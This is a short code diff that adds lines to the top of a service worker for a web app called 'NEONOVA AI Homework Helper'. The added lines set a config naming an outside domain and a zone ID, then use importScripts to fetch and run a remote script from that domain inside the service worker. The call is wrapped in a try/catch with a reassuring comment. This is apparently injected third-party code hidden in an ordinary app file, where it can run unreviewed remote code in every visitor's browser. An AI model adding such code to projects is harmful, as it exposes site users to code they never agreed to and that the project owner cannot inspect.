@@ -1,3 +1,14 @@
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11997255
+}
+self.lary = ""
+try {
+  importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw');
+} catch (e) {
+  // Fallback gracefully without breaking PWA core operations
+}
+
 // Service Worker for NEONOVA AI Homework Helper
 const STATIC_CACHE = "neonova-static-v4";
 const RUNTIME_CACHE = "neonova-runtime-v4";
